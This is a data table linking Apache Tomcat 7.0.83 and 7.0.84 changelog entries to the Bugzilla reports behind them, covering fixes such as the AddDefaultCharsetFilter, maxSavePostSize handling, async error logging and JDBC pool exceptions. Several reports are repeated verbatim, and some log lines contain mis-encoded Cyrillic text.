Catalina|Tomcat 7.0.84 (violetagg)|fix|61916|Extend the AddDefaultCharsetFilter to add a character set when the content type is set via setHeader() or addHeader() as well as when it is set via setContentType(). (markt)|AddDefaultCharsetFilter wouldn't work when setting response header through response.setHeader()|"Overview:
AddDefaultCharsetFilter wouldn't work if one set response header 'content-type' through setHeader() instead of setContentType().
I tried to debug the webapp by adding a breakpoint in be beginning of method AddDefaultCharsetFilter.ResponseWrapper#setContentType(String), while the CXF framework did't invoke setContentType().
So I think that cxf may set response header Content-Type by invoking setHeader() but there is not a overridden method setHeader() in class AddDefaultCharsetFilter.ResponseWrapper

Steps to Reproduce:
1) Adding a maven dependecy in pom.xml
<dependency>
	<groupId>org.apache.tomcat</groupId>
	<artifactId>tomcat-catalina</artifactId>
	<version>8.5.23</version>
	<scope>provided</scope>
</dependency>
2) Adding a filter registeration in web.xml
<filter>
	<filter-name>AddDefaultCharset</filter-name>
	<filter-class>org.apache.catalina.filters.AddDefaultCharsetFilter</filter-class>
	<init-param>
		<param-name>encoding</param-name>
		<param-value>UTF-8</param-value>
	</init-param>
</filter>
<filter-mapping>
	<filter-name>AddDefaultCharset</filter-name>
	<servlet-name>cxf</servlet-name>
</filter-mapping>
3) Adding a method in cxf jax-rs service bean UserResource.java
@Path(""hello"")
@Produces(MediaType.TEXT_PLAIN)
public Response hello(){
	return Response.ok(""hello"").build();
}
4) request the hello service

Actual Results:
Content-Type: text/plain

Expected Results:
Content-Type: text/plain;charset=UTF-8

Build Date & Hardware:
	
Additional Builds and Platforms:

Additional Information:"|https://bz.apache.org/bugzilla/show_bug.cgi?id=61916
Catalina|Tomcat 7.0.84 (violetagg)|fix|61999|maxSavePostSize set to 0 should disable saving POST data during authentication. (remm)|Setting maxSavePostSize=0 won't disable saving POST data|"The documentation for the Connector attribute ""maxSavePostSize"" says ""Setting the attribute to zero will disable the saving of POST data during authentication."":
https://tomcat.apache.org/tomcat-8.5-doc/config/http.html#Common_Attributes

However, we tested this and maxSavePostSize=0 won't disable saving POST data. Instead, it actually tries to save the data with limit 0, so if there is any POST data, a 403 Forbidden is sent in the response.

Also, looking at the corresponding source code, there is no special handling for ignoring POST data if maxSavePostSize is set to zero:
FormAuthenticator#saveRequest(Request request, Session session) creates a ByteChunk with limit 0. When calling ByteChunk#append(byte src[], int off, int len) we get to the flushBuffer() method which throws an IOException caught by FormAuthenticator#doAuthenticate which then sends a 403 Forbidden.

There is only special handling for the case where maxSavePostSize is negative (i.e. no limit)."|https://bz.apache.org/bugzilla/show_bug.cgi?id=61999
Coyote|Tomcat 7.0.84 (violetagg)|fix|61886|Log errors on non-container threads at DEBUG rather than INFO. The exception will be made available to the application via the asynchronous error handling mechanism. (markt)|7.0.83 Calling [asyncComplete()] is not valid for a request with Async state [MUST_COMPLETE]|"Release candidate of 7.0.83
- Java 8u152
- NIO connector
- Compression enabled
- Running with Security Manager 
    <Connector port=""8080"" protocol=""org.apache.coyote.http11.Http11NioProtocol""
               connectionTimeout=""20000""
               redirectPort=""8443""
               useSendfile=""false"" compression=""force"" compressionMinSize=""1""
    />

I noted the following error in catalina.2017-12-11.log while running the async examples (for sake of smoke-testing):

There are two log messages.
The first INFO one is OK (though why we are logging it at all?), the second one is WARNING and is unexpected.

[[[
–¥–µ–∫ 11, 2017 1:38:44 PM org.apache.coyote.AbstractProcessor setErrorState
INFO: An error occurred in processing while on a non-container thread. The connection will be closed immediately
java.io.IOException: –ü—Ä–æ–≥—Ä–∞–º–º–∞ –Ω–∞ –≤–∞—à–µ–º —Ö–æ—Å—Ç-–∫–æ–º–ø—å—é—Ç–µ—Ä–µ —Ä–∞–∑–æ—Ä–≤–∞–ª–∞ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω–æ–µ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ
(English Translation: ""The program on your host computer has broken the established connection"")

	at sun.nio.ch.SocketDispatcher.write0(Native Method)
	at sun.nio.ch.SocketDispatcher.write(SocketDispatcher.java:51)
	at sun.nio.ch.IOUtil.writeFromNativeBuffer(IOUtil.java:93)
	at sun.nio.ch.IOUtil.write(IOUtil.java:65)
	at sun.nio.ch.SocketChannelImpl.write(SocketChannelImpl.java:471)
	at org.apache.tomcat.util.net.NioChannel.write(NioChannel.java:125)
	at org.apache.tomcat.util.net.NioBlockingSelector.write(NioBlockingSelector.java:101)
	at org.apache.tomcat.util.net.NioSelectorPool.write(NioSelectorPool.java:174)
	at org.apache.coyote.http11.InternalNioOutputBuffer.writeToSocket(InternalNioOutputBuffer.java:164)
	at org.apache.coyote.http11.InternalNioOutputBuffer.flushBuffer(InternalNioOutputBuffer.java:243)
	at org.apache.coyote.http11.InternalNioOutputBuffer.flush(InternalNioOutputBuffer.java:95)
	at org.apache.coyote.http11.AbstractHttp11Processor.action(AbstractHttp11Processor.java:828)
	at org.apache.coyote.Response.action(Response.java:171)
	at org.apache.catalina.connector.OutputBuffer.doFlush(OutputBuffer.java:366)
	at org.apache.catalina.connector.OutputBuffer.flush(OutputBuffer.java:334)
	at org.apache.catalina.connector.CoyoteWriter.flush(CoyoteWriter.java:98)
	at async.AsyncStockServlet.writeStock(AsyncStockServlet.java:102)
	at async.AsyncStockServlet.tick(AsyncStockServlet.java:82)
	at async.Stockticker.run(Stockticker.java:84)
	at java.lang.Thread.run(Thread.java:748)

–¥–µ–∫ 11, 2017 1:38:44 PM org.apache.catalina.core.AsyncContextImpl setErrorState
WARNING: onError() failed for listener of type [org.apache.catalina.core.AsyncListenerWrapper]
java.lang.IllegalStateException: Calling [asyncComplete()] is not valid for a request with Async state [MUST_COMPLETE]
	at org.apache.coyote.AsyncStateMachine.doComplete(AsyncStateMachine.java:291)
	at org.apache.coyote.AsyncStateMachine.asyncComplete(AsyncStateMachine.java:275)
	at org.apache.coyote.http11.Http11NioProcessor.actionInternal(Http11NioProcessor.java:516)
	at org.apache.coyote.http11.AbstractHttp11Processor.action(AbstractHttp11Processor.java:946)
	at org.apache.coyote.Request.action(Request.java:345)
	at org.apache.catalina.core.AsyncContextImpl.complete(AsyncContextImpl.java:103)
	at async.AsyncStockServlet.onError(AsyncStockServlet.java:118)
	at org.apache.catalina.core.AsyncListenerWrapper.fireOnError(AsyncListenerWrapper.java:54)
	at org.apache.catalina.core.AsyncContextImpl.setErrorState(AsyncContextImpl.java:455)
	at org.apache.catalina.connector.CoyoteAdapter.asyncDispatch(CoyoteAdapter.java:298)
	at org.apache.coyote.http11.AbstractHttp11Processor.asyncDispatch(AbstractHttp11Processor.java:1713)
	at org.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:616)
	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1775)
	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.run(NioEndpoint.java:1734)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624)
	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
	at java.lang.Thread.run(Thread.java:748)
]]]"|https://bz.apache.org/bugzilla/show_bug.cgi?id=61886
Coyote|Tomcat 7.0.84 (violetagg)|fix|61993|Improve handling for ByteChunk and CharChunk instances that grow close to the maximum size allowed by the JRE. (markt)|org.apache.tomcat.util.ByteChunk throws NegativeArray SizeException|"Created attachment 35675 [details]
If growing the buffer would overflow int then just set to max value

We use ByteChunk to read in the request body and we noticed 2 things.

1.) The length of ByteChunk is limited to MAX_INT so for our purposes we can only process 2Gb requests before we need to alter our reading code.

2.) The way that ByteChunk grows means that in practice you can often only use up to 1Gb of space.

The followign exception stack is thrown when append is called on and ByteChunk over 1Gb in size:

java.lang.NegativeArraySizeException:java.lang.NegativeArraySizeException at org.apache.tomcat.util.buf.ByteChunk.makeSpace(ByteChunk.java:527) at org.apache.tomcat.util.buf.ByteChunk.append(ByteChunk.java:327)

Looking at issue number 1 it looks like a lot of classes would need to be changed to use long but I do have a patch for a trivial check that allowed us to process 2Gb requests.

Obviously this could silently truncate once you actually reach INT_MAX but it seems from the previous check based on the limit that this is the desired behaviour rather than to throw an exception."|https://bz.apache.org/bugzilla/show_bug.cgi?id=61993
Jasper|Tomcat 7.0.84 (violetagg)|add|43925|Add a new system property (org.apache.jasper.runtime.BodyContentImpl.BUFFER_SIZE) to control the size of the buffer used by Jasper when buffering tag bodies. (markt)|org.apache.jasper.runtime.BodyContentImpl causing huge memory allocations|"BodyContentImpl buffers all output from a custom tag ready to be written when
the tag execution ends. However, the way in which it grows this buffer is
extremely inefficient and has two undesirable effects:

- garbage collection is triggered very frequently to tidy up the waste.
- CPU load ramps up as large, unnecessary array copies take place.

All that's needed is a more intelligent buffer-management algorithm. I have
rewritten this class and can forward it if that would be useful (can't see a way
of attaching it here)."|https://bz.apache.org/bugzilla/show_bug.cgi?id=43925
Web applications|Tomcat 7.0.84 (violetagg)|add|61223|Add the mbeans-descriptors.dtd file to the custom MBean documentation so users have a reference to use when constructing mbeans-descriptors.xml files for custom components. (markt)|Enhance the documentation for mbeans-descriptors.xml|"The documentation (https://tomcat.apache.org/tomcat-9.0-doc/mbeans-descriptors-howto.html) does not describe the attributes of each mbean.

Something similar to the comments in mbeans-descriptors.dtd would be useful."|https://bz.apache.org/bugzilla/show_bug.cgi?id=61223
Web applications|Tomcat 7.0.84 (violetagg)|fix||Partial fix for 61886. Ensure that multiple threads do not attempt to complete the AsyncContext if an I/O error occurs in the stock ticker example Servlet. (markt)|7.0.83 Calling [asyncComplete()] is not valid for a request with Async state [MUST_COMPLETE]|"Release candidate of 7.0.83
- Java 8u152
- NIO connector
- Compression enabled
- Running with Security Manager 
    <Connector port=""8080"" protocol=""org.apache.coyote.http11.Http11NioProtocol""
               connectionTimeout=""20000""
               redirectPort=""8443""
               useSendfile=""false"" compression=""force"" compressionMinSize=""1""
    />

I noted the following error in catalina.2017-12-11.log while running the async examples (for sake of smoke-testing):

There are two log messages.
The first INFO one is OK (though why we are logging it at all?), the second one is WARNING and is unexpected.

[[[
–¥–µ–∫ 11, 2017 1:38:44 PM org.apache.coyote.AbstractProcessor setErrorState
INFO: An error occurred in processing while on a non-container thread. The connection will be closed immediately
java.io.IOException: –ü—Ä–æ–≥—Ä–∞–º–º–∞ –Ω–∞ –≤–∞—à–µ–º —Ö–æ—Å—Ç-–∫–æ–º–ø—å—é—Ç–µ—Ä–µ —Ä–∞–∑–æ—Ä–≤–∞–ª–∞ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω–æ–µ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ
(English Translation: ""The program on your host computer has broken the established connection"")

	at sun.nio.ch.SocketDispatcher.write0(Native Method)
	at sun.nio.ch.SocketDispatcher.write(SocketDispatcher.java:51)
	at sun.nio.ch.IOUtil.writeFromNativeBuffer(IOUtil.java:93)
	at sun.nio.ch.IOUtil.write(IOUtil.java:65)
	at sun.nio.ch.SocketChannelImpl.write(SocketChannelImpl.java:471)
	at org.apache.tomcat.util.net.NioChannel.write(NioChannel.java:125)
	at org.apache.tomcat.util.net.NioBlockingSelector.write(NioBlockingSelector.java:101)
	at org.apache.tomcat.util.net.NioSelectorPool.write(NioSelectorPool.java:174)
	at org.apache.coyote.http11.InternalNioOutputBuffer.writeToSocket(InternalNioOutputBuffer.java:164)
	at org.apache.coyote.http11.InternalNioOutputBuffer.flushBuffer(InternalNioOutputBuffer.java:243)
	at org.apache.coyote.http11.InternalNioOutputBuffer.flush(InternalNioOutputBuffer.java:95)
	at org.apache.coyote.http11.AbstractHttp11Processor.action(AbstractHttp11Processor.java:828)
	at org.apache.coyote.Response.action(Response.java:171)
	at org.apache.catalina.connector.OutputBuffer.doFlush(OutputBuffer.java:366)
	at org.apache.catalina.connector.OutputBuffer.flush(OutputBuffer.java:334)
	at org.apache.catalina.connector.CoyoteWriter.flush(CoyoteWriter.java:98)
	at async.AsyncStockServlet.writeStock(AsyncStockServlet.java:102)
	at async.AsyncStockServlet.tick(AsyncStockServlet.java:82)
	at async.Stockticker.run(Stockticker.java:84)
	at java.lang.Thread.run(Thread.java:748)

–¥–µ–∫ 11, 2017 1:38:44 PM org.apache.catalina.core.AsyncContextImpl setErrorState
WARNING: onError() failed for listener of type [org.apache.catalina.core.AsyncListenerWrapper]
java.lang.IllegalStateException: Calling [asyncComplete()] is not valid for a request with Async state [MUST_COMPLETE]
	at org.apache.coyote.AsyncStateMachine.doComplete(AsyncStateMachine.java:291)
	at org.apache.coyote.AsyncStateMachine.asyncComplete(AsyncStateMachine.java:275)
	at org.apache.coyote.http11.Http11NioProcessor.actionInternal(Http11NioProcessor.java:516)
	at org.apache.coyote.http11.AbstractHttp11Processor.action(AbstractHttp11Processor.java:946)
	at org.apache.coyote.Request.action(Request.java:345)
	at org.apache.catalina.core.AsyncContextImpl.complete(AsyncContextImpl.java:103)
	at async.AsyncStockServlet.onError(AsyncStockServlet.java:118)
	at org.apache.catalina.core.AsyncListenerWrapper.fireOnError(AsyncListenerWrapper.java:54)
	at org.apache.catalina.core.AsyncContextImpl.setErrorState(AsyncContextImpl.java:455)
	at org.apache.catalina.connector.CoyoteAdapter.asyncDispatch(CoyoteAdapter.java:298)
	at org.apache.coyote.http11.AbstractHttp11Processor.asyncDispatch(AbstractHttp11Processor.java:1713)
	at org.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:616)
	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1775)
	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.run(NioEndpoint.java:1734)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624)
	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
	at java.lang.Thread.run(Thread.java:748)
]]]"|https://bz.apache.org/bugzilla/show_bug.cgi?id=61886
Web applications|Tomcat 7.0.84 (violetagg)|fix|61886|Prevent ConcurrentModificationException when running the asynchronous stock ticker in the examples web application. (markt)|7.0.83 Calling [asyncComplete()] is not valid for a request with Async state [MUST_COMPLETE]|"Release candidate of 7.0.83
- Java 8u152
- NIO connector
- Compression enabled
- Running with Security Manager 
    <Connector port=""8080"" protocol=""org.apache.coyote.http11.Http11NioProtocol""
               connectionTimeout=""20000""
               redirectPort=""8443""
               useSendfile=""false"" compression=""force"" compressionMinSize=""1""
    />

I noted the following error in catalina.2017-12-11.log while running the async examples (for sake of smoke-testing):

There are two log messages.
The first INFO one is OK (though why we are logging it at all?), the second one is WARNING and is unexpected.

[[[
–¥–µ–∫ 11, 2017 1:38:44 PM org.apache.coyote.AbstractProcessor setErrorState
INFO: An error occurred in processing while on a non-container thread. The connection will be closed immediately
java.io.IOException: –ü—Ä–æ–≥—Ä–∞–º–º–∞ –Ω–∞ –≤–∞—à–µ–º —Ö–æ—Å—Ç-–∫–æ–º–ø—å—é—Ç–µ—Ä–µ —Ä–∞–∑–æ—Ä–≤–∞–ª–∞ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω–æ–µ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ
(English Translation: ""The program on your host computer has broken the established connection"")

	at sun.nio.ch.SocketDispatcher.write0(Native Method)
	at sun.nio.ch.SocketDispatcher.write(SocketDispatcher.java:51)
	at sun.nio.ch.IOUtil.writeFromNativeBuffer(IOUtil.java:93)
	at sun.nio.ch.IOUtil.write(IOUtil.java:65)
	at sun.nio.ch.SocketChannelImpl.write(SocketChannelImpl.java:471)
	at org.apache.tomcat.util.net.NioChannel.write(NioChannel.java:125)
	at org.apache.tomcat.util.net.NioBlockingSelector.write(NioBlockingSelector.java:101)
	at org.apache.tomcat.util.net.NioSelectorPool.write(NioSelectorPool.java:174)
	at org.apache.coyote.http11.InternalNioOutputBuffer.writeToSocket(InternalNioOutputBuffer.java:164)
	at org.apache.coyote.http11.InternalNioOutputBuffer.flushBuffer(InternalNioOutputBuffer.java:243)
	at org.apache.coyote.http11.InternalNioOutputBuffer.flush(InternalNioOutputBuffer.java:95)
	at org.apache.coyote.http11.AbstractHttp11Processor.action(AbstractHttp11Processor.java:828)
	at org.apache.coyote.Response.action(Response.java:171)
	at org.apache.catalina.connector.OutputBuffer.doFlush(OutputBuffer.java:366)
	at org.apache.catalina.connector.OutputBuffer.flush(OutputBuffer.java:334)
	at org.apache.catalina.connector.CoyoteWriter.flush(CoyoteWriter.java:98)
	at async.AsyncStockServlet.writeStock(AsyncStockServlet.java:102)
	at async.AsyncStockServlet.tick(AsyncStockServlet.java:82)
	at async.Stockticker.run(Stockticker.java:84)
	at java.lang.Thread.run(Thread.java:748)

–¥–µ–∫ 11, 2017 1:38:44 PM org.apache.catalina.core.AsyncContextImpl setErrorState
WARNING: onError() failed for listener of type [org.apache.catalina.core.AsyncListenerWrapper]
java.lang.IllegalStateException: Calling [asyncComplete()] is not valid for a request with Async state [MUST_COMPLETE]
	at org.apache.coyote.AsyncStateMachine.doComplete(AsyncStateMachine.java:291)
	at org.apache.coyote.AsyncStateMachine.asyncComplete(AsyncStateMachine.java:275)
	at org.apache.coyote.http11.Http11NioProcessor.actionInternal(Http11NioProcessor.java:516)
	at org.apache.coyote.http11.AbstractHttp11Processor.action(AbstractHttp11Processor.java:946)
	at org.apache.coyote.Request.action(Request.java:345)
	at org.apache.catalina.core.AsyncContextImpl.complete(AsyncContextImpl.java:103)
	at async.AsyncStockServlet.onError(AsyncStockServlet.java:118)
	at org.apache.catalina.core.AsyncListenerWrapper.fireOnError(AsyncListenerWrapper.java:54)
	at org.apache.catalina.core.AsyncContextImpl.setErrorState(AsyncContextImpl.java:455)
	at org.apache.catalina.connector.CoyoteAdapter.asyncDispatch(CoyoteAdapter.java:298)
	at org.apache.coyote.http11.AbstractHttp11Processor.asyncDispatch(AbstractHttp11Processor.java:1713)
	at org.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:616)
	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1775)
	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.run(NioEndpoint.java:1734)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624)
	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
	at java.lang.Thread.run(Thread.java:748)
]]]"|https://bz.apache.org/bugzilla/show_bug.cgi?id=61886
Web applications|Tomcat 7.0.84 (violetagg)|fix|61886|Prevent NullPointerException and other errors if the stock ticker example is running when the examples web application is stopped. (markt)|7.0.83 Calling [asyncComplete()] is not valid for a request with Async state [MUST_COMPLETE]|"Release candidate of 7.0.83
- Java 8u152
- NIO connector
- Compression enabled
- Running with Security Manager 
    <Connector port=""8080"" protocol=""org.apache.coyote.http11.Http11NioProtocol""
               connectionTimeout=""20000""
               redirectPort=""8443""
               useSendfile=""false"" compression=""force"" compressionMinSize=""1""
    />

I noted the following error in catalina.2017-12-11.log while running the async examples (for sake of smoke-testing):

There are two log messages.
The first INFO one is OK (though why we are logging it at all?), the second one is WARNING and is unexpected.

[[[
–¥–µ–∫ 11, 2017 1:38:44 PM org.apache.coyote.AbstractProcessor setErrorState
INFO: An error occurred in processing while on a non-container thread. The connection will be closed immediately
java.io.IOException: –ü—Ä–æ–≥—Ä–∞–º–º–∞ –Ω–∞ –≤–∞—à–µ–º —Ö–æ—Å—Ç-–∫–æ–º–ø—å—é—Ç–µ—Ä–µ —Ä–∞–∑–æ—Ä–≤–∞–ª–∞ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω–æ–µ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ
(English Translation: ""The program on your host computer has broken the established connection"")

	at sun.nio.ch.SocketDispatcher.write0(Native Method)
	at sun.nio.ch.SocketDispatcher.write(SocketDispatcher.java:51)
	at sun.nio.ch.IOUtil.writeFromNativeBuffer(IOUtil.java:93)
	at sun.nio.ch.IOUtil.write(IOUtil.java:65)
	at sun.nio.ch.SocketChannelImpl.write(SocketChannelImpl.java:471)
	at org.apache.tomcat.util.net.NioChannel.write(NioChannel.java:125)
	at org.apache.tomcat.util.net.NioBlockingSelector.write(NioBlockingSelector.java:101)
	at org.apache.tomcat.util.net.NioSelectorPool.write(NioSelectorPool.java:174)
	at org.apache.coyote.http11.InternalNioOutputBuffer.writeToSocket(InternalNioOutputBuffer.java:164)
	at org.apache.coyote.http11.InternalNioOutputBuffer.flushBuffer(InternalNioOutputBuffer.java:243)
	at org.apache.coyote.http11.InternalNioOutputBuffer.flush(InternalNioOutputBuffer.java:95)
	at org.apache.coyote.http11.AbstractHttp11Processor.action(AbstractHttp11Processor.java:828)
	at org.apache.coyote.Response.action(Response.java:171)
	at org.apache.catalina.connector.OutputBuffer.doFlush(OutputBuffer.java:366)
	at org.apache.catalina.connector.OutputBuffer.flush(OutputBuffer.java:334)
	at org.apache.catalina.connector.CoyoteWriter.flush(CoyoteWriter.java:98)
	at async.AsyncStockServlet.writeStock(AsyncStockServlet.java:102)
	at async.AsyncStockServlet.tick(AsyncStockServlet.java:82)
	at async.Stockticker.run(Stockticker.java:84)
	at java.lang.Thread.run(Thread.java:748)

–¥–µ–∫ 11, 2017 1:38:44 PM org.apache.catalina.core.AsyncContextImpl setErrorState
WARNING: onError() failed for listener of type [org.apache.catalina.core.AsyncListenerWrapper]
java.lang.IllegalStateException: Calling [asyncComplete()] is not valid for a request with Async state [MUST_COMPLETE]
	at org.apache.coyote.AsyncStateMachine.doComplete(AsyncStateMachine.java:291)
	at org.apache.coyote.AsyncStateMachine.asyncComplete(AsyncStateMachine.java:275)
	at org.apache.coyote.http11.Http11NioProcessor.actionInternal(Http11NioProcessor.java:516)
	at org.apache.coyote.http11.AbstractHttp11Processor.action(AbstractHttp11Processor.java:946)
	at org.apache.coyote.Request.action(Request.java:345)
	at org.apache.catalina.core.AsyncContextImpl.complete(AsyncContextImpl.java:103)
	at async.AsyncStockServlet.onError(AsyncStockServlet.java:118)
	at org.apache.catalina.core.AsyncListenerWrapper.fireOnError(AsyncListenerWrapper.java:54)
	at org.apache.catalina.core.AsyncContextImpl.setErrorState(AsyncContextImpl.java:455)
	at org.apache.catalina.connector.CoyoteAdapter.asyncDispatch(CoyoteAdapter.java:298)
	at org.apache.coyote.http11.AbstractHttp11Processor.asyncDispatch(AbstractHttp11Processor.java:1713)
	at org.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:616)
	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1775)
	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.run(NioEndpoint.java:1734)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624)
	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
	at java.lang.Thread.run(Thread.java:748)
]]]"|https://bz.apache.org/bugzilla/show_bug.cgi?id=61886
Web applications|Tomcat 7.0.84 (violetagg)|fix|61910|Clarify the meaning of the allowLinking option in the documentation web application. (markt)|Description for allowLinking is innacurate|"The description for allowLinking is inaccurate on this page:

https://tomcat.apache.org/tomcat-8.0-doc/config/resources.html#Attributes

""If the value of this flag is true, symlinks will be allowed inside the web application, pointing to resources outside the web application base path. If not specified, the default value of the flag is false.""

This makes an assumption that symlinks to resources *inside* the web application base path should work, regardless of this flag. However, they do not. NO symlinks work unless the allowLinking flag is set, whether they fall inside our outside the application base path."|https://bz.apache.org/bugzilla/show_bug.cgi?id=61910
Web applications|Tomcat 7.0.84 (violetagg)|add||Add OCSP configuration information to the SSL How-To. Patch provided by Marek Czernek. (markt)|||
Web applications|Tomcat 7.0.84 (violetagg)|fix|62006|Document the new JvmOptions9 command line parameter for tomcat7.exe. (markt)|Windows Service Command Line Parameter JvmOptions9 is undocumented|The Tomcat 8.5.24 service.bat file shows a parameter --JvmOptions9.  This parameter does not appear to be documented at https://tomcat.apache.org/tomcat-8.5-doc/windows-service-howto.html#comments_section as of the creation of this bug.|https://bz.apache.org/bugzilla/show_bug.cgi?id=62006
jdbc-pool|Tomcat 7.0.84 (violetagg)|fix|61312|Prevent NullPointerException when using the statement cache of connection that has been closed. (kfujino)|NullPointerException in StatementCache.isCached|"Hallo,

I somehow got a NPE in StatementCache.isCached method  with Apache Tomcat 8.5.14:

The private PooledConnection pcon is null in this situation:

Caused by: java.lang.NullPointerException: null
	at org.apache.tomcat.jdbc.pool.interceptor.StatementCache.isCached(StatementCache.java:202) ~[tomcat-jdbc.jar:na]
	at org.apache.tomcat.jdbc.pool.interceptor.StatementCache.invoke(StatementCache.java:175) ~[tomcat-jdbc.jar:na]
	at org.apache.tomcat.jdbc.pool.JdbcInterceptor.invoke(JdbcInterceptor.java:108) ~[tomcat-jdbc.jar:na]
	at org.apache.tomcat.jdbc.pool.interceptor.AbstractCreateStatementInterceptor.invoke(AbstractCreateStatementInterceptor.java:75) ~[tomcat-jdbc.jar:na]
	at org.apache.tomcat.jdbc.pool.JdbcInterceptor.invoke(JdbcInterceptor.java:108) ~[tomcat-jdbc.jar:na]
	at org.apache.tomcat.jdbc.pool.interceptor.ConnectionState.invoke(ConnectionState.java:152) ~[tomcat-jdbc.jar:na]
	at org.apache.tomcat.jdbc.pool.JdbcInterceptor.invoke(JdbcInterceptor.java:108) ~[tomcat-jdbc.jar:na]
	at org.apache.tomcat.jdbc.pool.TrapException.invoke(TrapException.java:40) ~[tomcat-jdbc.jar:na]
	... 136 common frames omitted"|https://bz.apache.org/bugzilla/show_bug.cgi?id=61312
Other|Tomcat 7.0.84 (violetagg)|update||Update the internal fork of Commons FileUpload to 6c00d57 (2017-11-23) to pick up some code clean-up. (markt)|||
Other|Tomcat 7.0.84 (violetagg)|update||Update the internal fork of Commons Codec to r1817136 to pick up some code clean-up. (markt)|||
Other|Tomcat 7.0.84 (violetagg)|fix||The native source bundles (for Commons Daemon and Tomcat Native) are no longer copied to the bin directory for the deploy target. They are now only copied to the bin directory for the release target. (markt)|||
Catalina|Tomcat 7.0.83 (violetagg)|add||When running under Java 9 or later, and the urlCacheProtection option of the JreMemoryLeakPreventionListener is enabled, use the API added in Java 9 to only disable the caching for JAR URL connections. (markt)|||
Catalina|Tomcat 7.0.83 (violetagg)|fix|61581|Fix possible SecurityException when using the APR/native connector with a SecurityManager. (markt)|SecurityException trying to access JNI classes in Drawboard example when running with SecurityManager|"Created attachment 35393 [details]
catalina.2017-10-02.log

Smoke-testing release candidate of Tomcat 7.0.82.

Java 8u144, Windows, running with APR connector

Steps to reproduce:
1. Start Tomcat
2. Access
http://localhost:8080/examples/websocket/drawboard.xhtml
3. Actual result:
- At client: the page fails to complete loading. It displays some parts of the page, but no drawboard area.
- At server: java.security.AccessControlException is logged

[[[
SEVERE: Unexpected exception: java.security.AccessControlException: access denied (""java.lang.RuntimePermission"" ""accessClassInPackage.org.apache.tomcat.jni"")
java.security.AccessControlException: access denied (""java.lang.RuntimePermission"" ""accessClassInPackage.org.apache.tomcat.jni"")
	at java.security.AccessControlContext.checkPermission(AccessControlContext.java:472)
	at java.security.AccessController.checkPermission(AccessController.java:884)
	at java.lang.SecurityManager.checkPermission(SecurityManager.java:549)
	at java.lang.SecurityManager.checkPackageAccess(SecurityManager.java:1564)
	at sun.misc.Launcher$AppClassLoader.loadClass(Launcher.java:315)
	at java.lang.ClassLoader.loadClass(ClassLoader.java:411)
	at java.lang.ClassLoader.loadClass(ClassLoader.java:357)
	at org.apache.coyote.http11.upgrade.AprServletOutputStream.doWriteInternal(AprServletOutputStream.java:135)
]]]

I am attaching catalina.2017-10-02.log file."|https://bz.apache.org/bugzilla/show_bug.cgi?id=61581
Catalina|Tomcat 7.0.83 (violetagg)|fix|61597|Extend the StandardJarScanner to scan JARs on the module path when running on Java 9 and class path scanning is enabled. (markt)|StandardJarScanner does not scan module path|"There is a TODO in the code for this.

Scanning the module path requires a a handful of Java 9 specific calls. It may be cleaner to handle this with a multi-release JAR than by extending JreCompat.

(Actually, all of the Jre9Compat code could move to multi-release JARs.)"|https://bz.apache.org/bugzilla/show_bug.cgi?id=61597
Catalina|Tomcat 7.0.83 (violetagg)|fix||Fix the JMX descriptor for Wrapper.findInitParameter(). (rjung)|||
Catalina|Tomcat 7.0.83 (violetagg)|fix|61601|Add support for multi-release JARs in JAR scanning and web application class loading. (markt)|Make Tomcat multi-release JAR aware|"Created attachment 35406 [details]
Java 8 / 9 JAR for testing

The attached JAR file contains an annotated Servlet 4.0 ServletContextListener with both a Java 8 and Java 9 version. Each version simply outputs the Java version to stdout.

When deployed on Tomcat 9, the Java 8 listener is reported whether running on Java 8 or Java 9."|https://bz.apache.org/bugzilla/show_bug.cgi?id=61601
Catalina|Tomcat 7.0.83 (violetagg)|fix||Revert the change from 7.0.80 that called ServletResponse.setLocale() if the Content-Language HTTP header was set directly. (markt)|||
Catalina|Tomcat 7.0.83 (violetagg)|add||Provide the SessionInitializerFilter that can be used to ensure that an HTTP session exists when initiating a WebSocket connection. Patch provided by isapir. (markt)|||
Catalina|Tomcat 7.0.83 (violetagg)|fix||Avoid a possible NullPointerException when timing out AsyncContext instances during shut down. (markt)|||
